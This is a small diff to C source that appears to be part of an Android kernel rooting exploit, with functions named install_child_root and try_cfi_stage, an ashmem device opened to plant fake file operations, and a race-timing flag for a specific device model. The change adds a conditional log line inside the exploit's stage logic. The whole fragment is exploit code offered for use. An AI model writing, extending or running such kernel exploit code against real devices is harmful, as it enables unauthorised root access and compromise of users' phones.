@@ -245,6 +245,10 @@ int install_child_root(int fd) {
 
 int try_cfi_stage(void) {
   cfi_attempts++;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  /* Use the S928 post-write boundary before the first fake-fops open. */
+  pr_info("stage=verifying-kernel-access\n");
+#endif
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
@@ -254,7 +258,6 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     return 0;
   }
-
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
